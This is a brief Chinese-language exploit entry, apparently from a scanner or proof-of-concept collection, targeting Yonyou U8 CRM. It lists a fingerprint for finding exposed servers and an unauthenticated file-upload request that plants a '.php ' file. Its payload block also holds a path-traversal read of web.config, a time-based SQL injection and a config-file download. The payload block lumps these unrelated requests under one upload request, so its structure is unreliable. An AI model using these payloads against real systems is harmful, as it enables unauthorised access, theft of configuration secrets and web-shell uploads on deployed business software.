# 用友-U8-CRM-未知漏洞

- **系统**：用友　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/js/tfunction.js"`
- **请求**：`POST //ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------269…`　`Accept-Charset: GB2312,utf-8;q=0.7,*;q=0.7`

**请求体 / payload**
```
/Utility/GetJSFile?filePath=../web.config
/lead/newleadhidden.php?DontCheckLogin=1&ID=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-
//file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream
test
-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="upload"
upload
-----------------------------269520967239406871642430066855--
```
- **预期**：200　|　—